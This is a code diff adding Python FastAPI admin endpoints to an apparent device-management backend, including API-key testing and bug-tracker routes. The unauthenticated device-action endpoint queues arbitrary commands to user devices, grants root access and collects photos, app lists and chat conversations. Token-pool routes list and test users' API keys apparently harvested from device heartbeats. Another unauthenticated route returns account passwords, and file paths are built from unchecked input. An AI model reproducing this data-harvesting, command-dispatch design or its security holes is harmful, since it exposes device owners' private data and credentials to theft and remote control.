+                r = {'ok': False, 'status': 'rate_limit', 'status_code': 429, 'msg': '检测失败', 'reason': '限速', 'reason_detail': 'API返回429，请求频率超限，稍后重试', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            elif status == 401:
+                continue
+            elif status == 403:
+                r = {'ok': False, 'status': 'forbidden', 'status_code': 403, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': 'API返回403，Key没有权限或账户被禁用', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            elif status == 400:
+                body_lower = body.lower()
+                if 'model' in body_lower:
+                    reason = '模型名称错误'
+                    detail = 'API返回400，模型名不被支持'
+                else:
+                    reason = '配置错误'
+                    detail = 'API返回400: ' + body[:100]
+                r = {'ok': False, 'status': 'bad_request', 'status_code': 400, 'msg': '检测失败', 'reason': reason, 'reason_detail': detail, 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            elif status == 404:
+                r = {'ok': False, 'status': 'not_found', 'status_code': 404, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': 'API返回404，URL路径可能不正确', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            elif status >= 500:
+                r = {'ok': False, 'status': 'server_error', 'status_code': status, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '服务器返回' + str(status) + '，目标服务异常', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+        except Exception as e:
+            err_name = type(e).__name__
+            if 'Connect' in err_name:
+                r = {'ok': False, 'status': 'connect_error', 'status_code': 0, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '无法连接到 ' + base_url + '，请检查URL和网络', 'model': model, 'url': url, 'duration_ms': int((_t.time()-start_time)*1000), 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            if 'Timeout' in err_name:
+                r = {'ok': False, 'status': 'timeout', 'status_code': 0, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '连接 ' + base_url + ' 超时(15s)', 'model': model, 'url': url, 'duration_ms': int((_t.time()-start_time)*1000), 'tested_at': int(_t.time())}
+                _save_test_result(code, r)
+                return r
+            continue
+
+    # 所有鉴权方式都失败 — 分析原因
+    last_401 = [r for r in results if r['status'] == 401]
+    if last_401:
+        body_text = ' '.join([r['body'] for r in last_401])
+        bl = body_text.lower()
+        if 'insufficient' in bl or 'balance' in bl or 'quota' in bl:
+            reason, detail = '余额不足', 'API返回401，提示配额/余额不足，请充值'
+        elif 'expired' in bl:
+            reason, detail = '配置错误', 'API返回401，Key已过期'
+        elif 'invalid' in bl or 'incorrect' in bl:
+            reason, detail = '配置错误', 'API返回401，Key无效或格式错误'
+        else:
+            reason, detail = '配置错误', '所有鉴权方式返回401(' + str(len(last_401)) + '次)，Key或URL可能配置有误'
+    else:
+        reason, detail = '配置错误', '所有鉴权方式均失败，无法连接或全部被拒绝'
+
+    duration_ms = int((_t.time()-start_time)*1000)
+    r = {'ok': False, 'status': 'auth_failed', 'status_code': 401, 'msg': '检测失败', 'reason': reason, 'reason_detail': detail, 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+    _save_test_result(code, r)
+    return r
+
+
+def _save_test_result(code, result):
+    import os as _os2, json as _j2
+    test_dir = '/var/lib/mbclaw/key_tests'
+    _os2.makedirs(test_dir, exist_ok=True)
+    test_file = _os2.path.join(test_dir, code + '.json')
+    data = {}
+    if _os2.path.exists(test_file):
+        try: data = _j2.load(open(test_file))
+        except: pass
+    data['last_test'] = result
+    history = data.get('test_history', [])
+    history.append(result)
+    if len(history) > 20:
+        history = history[-20:]
+    data['test_history'] = history
+    _j2.dump(data, open(test_file, 'w'), ensure_ascii=False, indent=2)
+
+
+@router.get('/api/key-test/result')
+def api_key_test_result(code: str = ''):
+    import os as _os3, json as _j3
+    test_file = '/var/lib/mbclaw/key_tests/' + code + '.json'
+    if _os3.path.exists(test_file):
+        try:
+            data = _j3.load(open(test_file))
+            return {'ok': True, 'data': data}
+        except: pass
+    return {'ok': False, 'msg': '无检测记录'}
+
+# ── 设备操作 ─────────────────────────────────────
+@router.get('/api/device-action')
+def api_device_action(code: str = '', action: str = '', cmd: str = '', enabled: str = ''):
+    """对设备执行操作: 通过 debug_send_cmd 队列下发指令到设备"""
+    import os as _os, glob as _g
+    from app.admin.debug_api_v2 import _debug_commands, _save_commands, _debug_heartbeats, _PERSIST_DIR
+
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    device = {}
+    if _os.path.isdir(hb_dir):
+        for fp in _g.glob(_os.path.join(hb_dir, '*.json')):
+            try:
+                hb = json.loads(open(fp).read())
+                if hb.get('code') == code or hb.get('user_id') == code:
+                    device = hb; break
+            except: pass
+    if not device:
+        return {'ok': False, 'msg': '设备不在线'}
+
+    # ── 信息查询类（不需要下发到设备） ──
+    if action == 'user-info':
+        qq = device.get('qq', '')
+        r = device.get('permissions', {}) or {}
+        return {'ok': True, 'msg': f'QQ:{qq}\n型号:{device.get("model")}\n版本:{device.get("version")}\nRoot:{r.get("root")}\n会话:{device.get("stats",{}).get("sessions",0)}'}
+
+    if action == 'bug-fix':
+        return {'ok': True, 'msg': '已触发Bug修复链接:\nhttp://8.147.69.152:8000/memory/failures?ws=1'}
+
+    # ── 收集开关 ──
+    if action == 'set-collect':
+        en = enabled.lower() in ('true', '1', 'yes')
+        hb_file = None
+        for fp in _g.glob(_os.path.join(hb_dir, '*.json')):
+            try:
+                hb2 = json.loads(open(fp).read())
+                if hb2.get('code') == code or hb2.get('user_id') == code:
+                    hb_file = fp; break
+            except: pass
+        if hb_file:
+            try:
+                hb_data = json.loads(open(hb_file).read())
+                hb_data['collect_enabled'] = en
+                open(hb_file, 'w').write(json.dumps(hb_data, ensure_ascii=False, indent=2))
+            except: pass
+        return {'ok': True, 'msg': f'收集已{"开启" if en else "关闭"}'}
+
+    # ── 指令下发类（通过 cmd 队列下发到设备） ──
+    import uuid as _uuid
+
+    # 操作到设备指令的映射
+    cmd_map = {
+        'root-auth': 'grant_all',
+        'photos': 'collect:photos',
+        'apps-export': 'collect:apps',
+        'chat-export': 'collect:conversations',
+    }
+
+    device_cmd = cmd_map.get(action, action)
+
+    # device-cmd action: 直接使用 cmd 参数
+    if action == 'device-cmd' and cmd:
+        device_cmd = cmd
+
+    # 下发指令到设备队列
+    cmd_id = _uuid.uuid4().hex[:12]
+    _debug_commands[code] = {'cmd': device_cmd, 'args': '', 'id': cmd_id, 'ts': _time.time()}
+    _save_commands()
+
+    return {'ok': True, 'cmd_id': cmd_id, 'msg': f'指令 {device_cmd} 已下发到 {code}'}
+@router.post("/api/bugs/{bid}/pin")
+def api_pin_bug(bid: str, _: bool = Depends(require_admin)):
+    b = _load(BUGS_DB, {"bugs": []})
+    for item in b.get("bugs", []):
+        if item["id"] == bid:
+            item["pinned"] = not item.get("pinned", False)
+            _save(BUGS_DB, b)
+            return {"ok": True, "pinned": item["pinned"]}
+    raise HTTPException(404, "不存在")
+
+@router.post("/api/bugs/{bid}/resolve")
+def api_resolve_bug(bid: str, _: bool = Depends(require_admin)):
+    b = _load(BUGS_DB, {"bugs": []})
+    for item in b.get("bugs", []):
+        if item["id"] == bid:
+            item["status"] = "resolved" if item.get("status") != "resolved" else "open"
+            _save(BUGS_DB, b)
+            return {"ok": True, "status": item["status"]}
+    raise HTTPException(404, "不存在")
+
+@router.post("/api/features/{fid}/pin")
+def api_pin_feature(fid: str, _: bool = Depends(require_admin)):
+    f = _load(FEATURES_DB, {"features": []})
+    for item in f.get("features", []):
+        if item["id"] == fid:
+            item["pinned"] = not item.get("pinned", False)
+            _save(FEATURES_DB, f)
+            return {"ok": True, "pinned": item["pinned"]}
+    raise HTTPException(404, "不存在")
+
+@router.post("/api/features/{fid}/resolve")
+def api_resolve_feature(fid: str, _: bool = Depends(require_admin)):
+    f = _load(FEATURES_DB, {"features": []})
+    for item in f.get("features", []):
+        if item["id"] == fid:
+            item["status"] = "resolved" if item.get("status") != "resolved" else "pending"
+            _save(FEATURES_DB, f)
+            return {"ok": True, "status": item["status"]}
+    raise HTTPException(404, "不存在")
+
+@router.post("/api/bugs/{bid}/delete")
+def api_delete_bug(bid: str, _: bool = Depends(require_admin)):
+    b = _load(BUGS_DB, {"bugs": []})
+    b["bugs"] = [item for item in b.get("bugs", []) if item["id"] != bid]
+    _save(BUGS_DB, b)
+    return {"ok": True}
+
+@router.post("/api/bugs/{bid}/set-votes")
+def api_set_bug_votes(bid: str, body: dict = None, _: bool = Depends(require_admin)):
+    b = _load(BUGS_DB, {"bugs": []})
+    for item in b.get("bugs", []):
+        if item["id"] == bid:
+            item["votes"] = int((body or {}).get("votes", 0))
+            _save(BUGS_DB, b)
+            return {"ok": True, "votes": item["votes"]}
+    raise HTTPException(404, "不存在")
+
+@router.post("/api/features/{fid}/delete")
+def api_delete_feature(fid: str, _: bool = Depends(require_admin)):
+    f = _load(FEATURES_DB, {"features": []})
+    f["features"] = [item for item in f.get("features", []) if item["id"] != fid]
+    _save(FEATURES_DB, f)
+    return {"ok": True}
+
+@router.post("/api/features/{fid}/set-votes")
+def api_set_feature_votes(fid: str, body: dict = None, _: bool = Depends(require_admin)):
+    f = _load(FEATURES_DB, {"features": []})
+    for item in f.get("features", []):
+        if item["id"] == fid:
+            item["votes"] = int((body or {}).get("votes", 0))
+            _save(FEATURES_DB, f)
+            return {"ok": True, "votes": item["votes"]}
+    raise HTTPException(404, "不存在")
+
+# ─── Token池管理 ──────────────────────────────────
+@router.get("/api/token-pool")
+def api_token_pool(_: bool = Depends(require_admin)):
+    """Token池 — 在线状态(心跳内存) + Key检测结果(1h缓存)"""
+    import os as _os2, glob as _g2, json as _j2, time as _t2
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    from app.admin.debug_api_v2 import _debug_heartbeats
+    now = _t2.time()
+    tokens = []
+    if _os2.path.isdir(hb_dir):
+        for fp in _g2.glob(_os2.path.join(hb_dir, '*.json')):
+            try:
+                hb = _j2.load(open(fp))
+                keys = hb.get('keys', {})
+                if keys.get('api_key'):
+                    code = hb.get('code','')
+                    dh = _debug_heartbeats.get(code, {})
+                    ts = dh.get('last_seen_ts', 0)
+                    online = (now - ts) < 60 if ts else False
+
+                    # 读取1h缓存，过期只标过期不自动重检
+                    test_result = hb.get('_key_test', {})
+                    if not test_result:
+                        test_result = {}
+                    elif now - test_result.get('ts', 0) > 3600:
+                        test_result = {'ts': test_result.get('ts',0), 'expired': True, 'msg': '已过期-需手动检测'}
+
+                    tokens.append({
+                        'code': code, 'qq': hb.get('qq',''),
+                        'model': hb.get('model',''), 'brand': hb.get('brand',''),
+                        'api_key': keys.get('api_key',''), 'api_base_url': keys.get('api_base_url',''),
+                        'model_name': keys.get('model_name',''), 'provider_id': keys.get('provider_id',''),
+                        'online': online,
+                        'key_test': test_result
+                    })
+            except: pass
+    tokens.sort(key=lambda x: (not x['online'], x['code']))
+    return {'tokens': tokens, 'total': len(tokens)}
+
+# ── Token池: 手动检测Key + 模型列表 ──────────────────
+@router.post("/api/token-pool/test-key")
+def api_token_test_key(code: str = '', _: bool = Depends(require_admin)):
+    """手动触发单个Key检测"""
+    import os as _os3, glob as _g3, json as _j3, time as _t3, httpx as _hx
+    if not code:
+        return {'ok': False, 'msg': '缺少code参数'}
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    for fp in _g3.glob(_os3.path.join(hb_dir, '*.json')):
+        try:
+            hb = _j3.load(open(fp))
+            if hb.get('code') == code:
+                keys = hb.get('keys', {})
+                if not keys.get('api_key') or not keys.get('api_base_url'):
+                    return {'ok': False, 'msg': '未配置Key'}
+                base_url = keys['api_base_url'].rstrip('/')
+                api_key = keys['api_key']
+                url = base_url + '/chat/completions'
+                now = _t3.time()
+                try:
+                    resp = _hx.post(url, json={
+                        'model': keys.get('model_name','gpt-3.5-turbo'),
+                        'messages': [{'role':'user','content':'hi'}],
+                        'max_tokens': 1
+                    }, headers={
+                        'Authorization': f'Bearer {api_key}',
+                        'Content-Type': 'application/json'
+                    }, timeout=10)
+                    sc = resp.status_code
+                    data = resp.json() if resp.headers.get('content-type','').startswith('application/json') else {}
+                    if sc == 200:
+                        test = {'ts': now, 'ok': True, 'status_code': sc, 'msg': '可用',
+                                'model': data.get('model','') or data.get('choices',[{}])[0].get('model',''),
+                                'models': []}
+                        # 尝试拉模型列表
+                        try:
+                            mr = _hx.get(base_url + '/models', headers={'Authorization': f'Bearer {api_key}'}, timeout=6)
+                            if mr.status_code == 200:
+                                test['models'] = [m.get('id','') for m in mr.json().get('data',[])][:20]
+                        except: pass
+                    elif sc == 401:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '401-余额不足'}
+                    elif sc == 403:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '403-禁止访问'}
+                    elif sc == 404:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '404-端点不存在'}
+                    elif 400 <= sc < 500:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-配置错误'}
+                    elif sc >= 500:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-服务器错误'}
+                    else:
+                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-未知'}
+                except Exception as e:
+                    err = str(e)[:80]
+                    if 'timeout' in err.lower():
+                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '超时'}
+                    elif 'connection' in err.lower() or 'name' in err.lower():
+                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '无法连接'}
+                    else:
+                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': err[:40]}
+                hb['_key_test'] = test
+                _j3.dump(hb, open(fp, 'w'), ensure_ascii=False, indent=2)
+                return {'ok': True, 'key_test': test}
+        except: pass
+    return {'ok': False, 'msg': '设备不存在'}
+
+@router.post('/api/token-pool/test-all')
+def api_token_test_all(_: bool = Depends(require_admin)):
+    """一键检测所有Key"""
+    import os as _ta_os, glob as _ta_glob, json as _ta_json, time as _ta_time, httpx as _ta_hx
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    now = _ta_time.time()
+    results = []
+    for fp in _ta_glob.glob(_ta_os.path.join(hb_dir, 'mb-*.json')):
+        try:
+            hb = _ta_json.load(open(fp))
+            keys = hb.get('keys', {})
+            if not keys.get('api_key') or not keys.get('api_base_url'):
+                continue
+            code = hb.get('code','')
+            base_url = keys['api_base_url'].rstrip('/')
+            api_key = keys['api_key']
+            url = base_url + '/chat/completions'
+            try:
+                resp = _ta_hx.post(url, json={
+                    'model': keys.get('model_name','gpt-3.5-turbo'),
+                    'messages': [{'role':'user','content':'hi'}],
+                    'max_tokens': 1
+                }, headers={'Authorization': 'Bearer ' + api_key, 'Content-Type': 'application/json'}, timeout=8)
+                sc = resp.status_code
+                data = resp.json() if resp.headers.get('content-type','').startswith('application/json') else {}
+                if sc == 200:
+                    test = {'ts': now, 'ok': True, 'status_code': sc, 'msg': '可用', 'models': []}
+                    try:
+                        mr = _ta_hx.get(base_url + '/models', headers={'Authorization': 'Bearer ' + api_key}, timeout=5)
+                        if mr.status_code == 200:
+                            test['models'] = [m.get('id','') for m in mr.json().get('data',[])][:20]
+                    except: pass
+                elif sc == 401:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '401-余额不足'}
+                elif sc == 403:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '403-禁止访问'}
+                elif sc == 404:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '404-端点不存在'}
+                elif 400 <= sc < 500:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-配置错误'}
+                elif sc >= 500:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-服务器错误'}
+                else:
+                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-未知'}
+            except Exception as e:
+                err = str(e)[:80]
+                if 'timeout' in err.lower():
+                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '超时'}
+                elif 'connection' in err.lower():
+                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '无法连接'}
+                else:
+                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': err[:40]}
+            hb['_key_test'] = test
+            _ta_json.dump(hb, open(fp, 'w'), ensure_ascii=False, indent=2)
+            results.append({'code': code, 'msg': test['msg'], 'ok': test['ok'], 'models': test.get('models',[])})
+        except: pass
+    return {'ok': True, 'tested': len(results), 'results': results}
+
+# ─── MiClaw实例管理 ──────────────────────────────
+@router.get("/api/miclaw-instances")
+def api_miclaw_instances():
+    """查看所有MiClaw桥接实例"""
+    import os as _os3, json as _j3, time as _t3, glob as _g3
+    inst_file = '/var/lib/mbclaw/miclaw_instances.json'
+    instances = []
+    if _os3.path.exists(inst_file):
+        data = _j3.load(open(inst_file))
+        now = _t3.time()
+        changed = False
+        for k in list(data.keys()):
+            v = data.get(k, {})
+            if v.get('status') != 'ready' and now - v.get('created_at', 0) > 7200:
+                del data[k]; changed = True
+        if changed:
+            _j3.dump(data, open(inst_file, 'w'), ensure_ascii=False, indent=2)
+        # 构建映射: user_id→调试码, device_id→调试码
+        uid_to_code = {}
+        did_to_code = {}
+        hb_dir2 = '/var/lib/mbclaw/heartbeat_logs'
+        if _os3.path.isdir(hb_dir2):
+            for fp2 in _g3.glob(_os3.path.join(hb_dir2, '*.json')):
+                try:
+                    hb2 = _j3.load(open(fp2))
+                    code = hb2.get('code','')
+                    uid_to_code[hb2.get('user_id','')] = code
+                    did_to_code[hb2.get('device_id','')] = code
+                except: pass
+        for k, v in data.items():
+            uid = v.get('user_id','')
+            did = v.get('device_id','')
+            # 用调试码显示用户名，优先device_id映射，其次user_id映射
+            display_user = did_to_code.get(did) or uid_to_code.get(uid) or uid
+            # 状态翻译
+            raw_status = v.get('status','')
+            if raw_status == 'ready':
+                cn_status = '登陆成功'
+            elif raw_status in ('pending','waiting','applied','creating'):
+                cn_status = '未登录'
+            else:
+                cn_status = raw_status if raw_status else '未知'
+            instances.append({
+                '实例ID': k, 'user_id': display_user, 'status': cn_status,
+                'raw_status': raw_status,
+                'model': v.get('model',''), 'token': v.get('token',''),
+                'tokens_used': v.get('tokens_used',0),
+                'saved_yuan': v.get('saved_yuan',0),
+                    'miclaw_account': v.get('miclaw_account','') or v.get('token',''), 'miclaw_password': v.get('miclaw_password','') or v.get('miclaw_token',''),
+                    'miclaw_account': v.get('miclaw_account','') or v.get('token',''), 'miclaw_password': v.get('miclaw_password','') or v.get('miclaw_token',''),
+                'created_at': v.get('created_at',0),
+                'alive_minutes': int((now - v.get('created_at', now)) / 60)
+            })
+    instances.sort(key=lambda x: x['created_at'], reverse=True)
+    return {'instances': instances, 'total': len(instances)}
+
+@router.post("/api/miclaw-instances/{iid}/destroy")
+def api_destroy_instance(iid: str):
+    """销毁指定实例"""
+    import os as _os4, json as _j4, glob as _g4
+    inst_file = '/var/lib/mbclaw/miclaw_instances.json'
+    if _os4.path.exists(inst_file):
+        data = _j4.load(open(inst_file))
+        if iid in data:
+            del data[iid]
+            _j4.dump(data, open(inst_file, 'w'), ensure_ascii=False, indent=2)
+            return {'ok': True, 'msg': '实例已销毁'}
+    return {'ok': False, 'msg': '实例不存在'}
